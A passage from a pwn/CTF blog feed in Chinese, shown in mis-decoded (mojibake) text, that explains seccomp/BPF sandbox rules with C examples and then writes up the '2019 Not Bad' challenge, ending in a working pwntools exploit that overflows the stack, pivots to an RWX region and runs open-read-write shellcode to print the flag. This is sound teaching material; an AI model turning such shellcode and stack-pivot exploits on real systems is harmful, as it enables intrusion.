class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>â€‹ä¸Šé¢çš„ä¾‹å­ä¸­ç¦ç”¨äº† execve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œ64 ä½ç³»ç»Ÿä¸­ execve çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 59.</p><p>â€‹BPF_JUMP åçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¦è®¾ç½®çš„éœ€è¦ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p><p>â€‹æˆ‘ä»¬åœ¨è¿™é‡Œç¦ç”¨çš„ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨åˆ†åˆ«æ˜¯ sys_restart_syscall å’Œ execveï¼Œå¦‚æœå‡ºç°è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šè·³è½¬åˆ° BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_ERRNO) çš„å¼‚å¸¸å¤„ç†ã€‚å…¶å®ï¼Œå¦‚æœæˆ‘ä»¬è¦ç›´æ¥æ€æ­»è¿™ä¸ªè¿›ç¨‹çš„è¯ï¼ŒBPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_KILL) è¿™ä¸ªè§„åˆ™å¯ä»¥ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚</p><p>â€‹GitHub ä¸Šçš„ä¸€ä¸ªçœŸå®ä¾‹å­ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm50bG56LzA4YWUyMGJlZmI5MWJlZmQ5YTUzY2Q5MWNkYzZkNTA3">ä¾‹å­</span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> nr, <span class="type">int</span> arch, <span class="type">int</span> error)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">      .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">      .filter = filter,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;something&#x27;s gonna happen!!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;it will not definitely print this here\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç”¨  <code>seccomp-tools</code>  æ¥ dump ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/seccomp$ seccomp-tools dump ./prctl</span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>â€‹ç¦ç”¨æ‰ä¹‹åï¼Œæˆ‘ä»¬é€šè¿‡ seccomp æ¥ dump ä¸€ä¸‹ã€‚æˆ‘ä»¬çœ‹åˆ°ï¼Œæœ€å‰é¢çš„å°±æ˜¯ sock_filter ç»“æ„ä½“çš„å››ä¸ªå‚æ•°ï¼Œåé¢çš„ï¼Œå°±æ˜¯ bpf è§„åˆ™çš„æ±‡ç¼–è¡¨ç¤ºã€‚</p><h2 id="4-orw"><a class="markdownIt-Anchor" href="#4-orw">#</a> 4ã€orwï¼š</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019not-bad"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2019not-bad">#</a> [æå®¢å¤§æŒ‘æˆ˜ 2019] Not Badï¼š</h3><p>â€‹å…ˆæ£€æŸ¥ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰å¼€ä¿æŠ¤ï¼Œä¸”å­˜åœ¨ RWX æ®µï¼ŒIDA çœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‡½æ•°åç­‰ç­‰æœ‰é—®é¢˜ï¼Œè¯•ç€æ¢å¤ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  init_0();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç®€å•æ¢å¤äº†ä¸‹ä¹‹åæ˜¯è¿™æ ·ï¼Œå…ˆçœ‹çœ‹ seccomp å‡½æ•°ï¼Œé‡Œé¢å¾ˆæ˜æ˜¾å­˜åœ¨æ²™ç›’ï¼ˆå¯èƒ½æ˜¯ç§ä¸ä¸“ä¸šçš„è¯´æ³•ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¥½ï¼Œé‚£ä¹ˆç›´æ¥ç”¨ seccomp-tools å·¥å…· dump ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>â€‹æœ€åå‘ç°å¯ä»¥åˆ©ç”¨çš„ç³»ç»Ÿè°ƒç”¨æœ‰ orw ä¸‰ä¸ªï¼Œé‚£ä¹ˆçœ‹çœ‹ vuln å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ„Ÿè§‰å¯ä»¥æ‰“ shellcodeï¼Œä½†æ˜¯ï¼Œæ˜æ˜¾å‘ç°æ ˆçš„é•¿åº¦ä¸å¤Ÿ ret2shellcodeï¼Œæ¨æµ‹ä¸€æ‰‹æ ˆè¿ç§»ï¼Œè¯•è¯•çœ‹ã€‚</p><p>â€‹ç»è¿‡åŠ¨è°ƒä¹‹åï¼Œå‘ç°åœ¨æ‰§è¡Œåˆ°å‡½æ•° mmap ä¹‹åï¼Œå­˜åœ¨ä¸€ä¸ªå¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜æ®µï¼ˆæ‰”ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼šè¿™é‡Œ mmap å‚æ•°ç±»å‹æ˜¯ï¼ˆèµ·å§‹åœ°å€ï¼Œå¤§å°ï¼Œä¿æŠ¤ç±»ï¼Œæ–‡ä»¶æè¿°ç¬¦] ç­‰ï¼‰ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x123000           0x124000 -wxp     1000      0 [anon_00123]</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥å°†æ ˆè¿ç§»åˆ°è¿™å„¿å»ï¼Œå†æ‰§è¡Œ shellcode æˆ–è€… syscall è¯»æ–‡ä»¶ï¼Œä¸è¿‡ï¼Œè¿™ä¸ªè¦ä¹‹åå†è¯´äº†ã€‚å¤§æ¦‚æ€è·¯è¯´ä¸‹å§ï¼Œå…ˆé€šè¿‡ shellcode è°ƒç”¨ read å‡½æ•°å°†è¯»æ–‡ä»¶å†™å…¥å†…å­˜ç„¶åè¾“å‡ºè¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼Œå…ˆè´´ä¸€ä¸‹ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    mnap = <span class="number">0x123000</span></span><br><span class="line">    jmp_rsp = <span class="number">0x0400a01</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">    shellcode = asm(shellcraft.read(<span class="number">0</span>,mnap,<span class="number">0x100</span>))</span><br><span class="line">    shellcode += asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<span class="comment">#è¿™é‡Œçš„å‡0x30æˆ‘æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œè®°å½•åœ¨è¿™å„¿</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    payload2 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line">    io.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">ä» prctl å‡½æ•°å¼€å§‹å­¦ä¹ æ²™ç®±è§„åˆ™</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21yaGVzb25nemUvYXJ0aWNsZS9kZXRhaWxzLzEwMzAwODkyNQ==">BPF è¯¦è§£</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2eHU2NjYvYXJ0aWNsZS9kZXRhaWxzLzEzMDgyMTMzMA==">å‡½æ•° prctl ç³»ç»Ÿè°ƒç”¨</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆè¯†pwnæ²™ç®±&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#åˆè¯†pwnæ²™ç®±&quot;&gt;#&lt;/a&gt; åˆè¯† Pwn æ²™ç®±&lt;/h1&gt;
&lt;p&gt;â€‹		æ²™ç®±æœºåˆ¶ï¼Œè‹±æ–‡ sandboxï¼Œæ˜¯è®¡ç®—æœºé¢†åŸŸçš„è™šæ‹ŸæŠ€æœ¯ï¼Œå¸¸è§äºå®‰å…¨æ–¹å‘ã€‚ä¸€èˆ¬è¯´æ¥ï¼Œæˆ‘ä»¬ä¼šå°†ä¸å—ä¿¡ä»»çš„è½¯</summary>
      
    
    
    
    <category term="Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…»" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
</feed>
